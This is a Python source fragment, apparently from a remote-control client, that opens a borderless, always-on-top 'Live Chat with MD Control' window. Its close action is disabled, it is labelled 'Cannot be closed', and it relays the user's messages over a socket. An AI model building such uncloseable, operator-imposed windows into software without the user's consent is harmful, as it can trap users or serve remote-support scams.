            except Exception:
                _chat_window = None

        if _ctk_root is None:
            return

        _chat_window = ctk.CTkToplevel(_ctk_root)
        _chat_window.title("💬 Live Chat")
        _chat_window.geometry("800x600")
        _chat_window.resizable(False, False)
        _chat_window.overrideredirect(True)
        _chat_window.protocol("WM_DELETE_WINDOW", lambda: None)
        _chat_window.attributes("-topmost", True)
        _chat_window.update_idletasks()
        sw = _chat_window.winfo_screenwidth()
        sh = _chat_window.winfo_screenheight()
        cx = (sw - 800) // 2
        cy = (sh - 600) // 2
        _chat_window.geometry(f"800x600+{cx}+{cy}")

        header = ctk.CTkFrame(_chat_window, fg_color="#161b22", height=50, corner_radius=0)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        ctk.CTkLabel(header, text="💬 Live Chat with MD Control", text_color="#f0f6fc",
                     fg_color="#161b22", font=("Segoe UI", 14, "bold")).pack(side=tk.LEFT, padx=15, pady=12)
        ctk.CTkLabel(header, text="🔒 Cannot be closed", text_color="#f85149",
                     fg_color="#161b22", font=("Segoe UI", 9)).pack(side=tk.RIGHT, padx=15)

        _chat_messages_text = ctk.CTkTextbox(_chat_window, fg_color="#0d1117", text_color="#f0f6fc",
                                              font=("Consolas", 14), wrap="word", border_width=0)
        _chat_messages_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(10, 0))
        _chat_messages_text.tag_config("tech", foreground="#58a6ff")
        _chat_messages_text.tag_config("me", foreground="#3fb950")
        _chat_messages_text.tag_config("system", foreground="#f2be5c")

        input_frame = ctk.CTkFrame(_chat_window, fg_color="#161b22", height=70, corner_radius=0)
        input_frame.pack(fill=tk.X, padx=0, pady=0)
        input_frame.pack_propagate(False)

        msg_entry = ctk.CTkEntry(input_frame, fg_color="#0d1117", text_color="#f0f6fc",
                                 font=("Segoe UI", 16), placeholder_text="Type your message here...",
                                 border_color="#20324f", border_width=1, corner_radius=8)
        msg_entry.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 5), pady=12, ipady=6)

        _sock_ref = _chat_sock

        def _send_reply(event=None):
            msg = msg_entry.get().strip()
            if not msg:
                return
            msg_entry.delete(0, tk.END)
            _append_chat_message("You", msg)
            try:
                payload = json.dumps({"action": "chat_client_msg", "message": msg}).encode()
                if _sock_ref:
                    threading.Thread(target=_safe_send, args=(_sock_ref, payload), daemon=True).start()
            except Exception:
                pass

        msg_entry.bind("<Return>", _send_reply)
        ctk.CTkButton(input_frame, text="📤 Send", fg_color="#238636", hover_color="#2ea043",
                      text_color="#f8fbff", font=("Segoe UI", 15, "bold"),
                      command=_send_reply, width=100).pack(side=tk.RIGHT, padx=(5, 10), pady=12)

        _append_chat_message("MD Control", message)
    except Exception:
        pass

def _append_chat_message(sender, message):
    global _chat_messages_text, _chat_window
    try:
        if _chat_window is None:
            return
        def _do():
            try:
                tag = "tech"
                if sender == "You":
                    tag = "me"
                elif sender == "System":
                    tag = "system"
                _chat_messages_text.configure(state="normal")
                _chat_messages_text.insert(tk.END, f"[{sender}]: {message}\n", tag)
                _chat_messages_text.see(tk.END)
                _chat_messages_text.configure(state="disabled")
            except Exception:
                pass
        _chat_window.after(0, _do)
    except Exception:
        pass

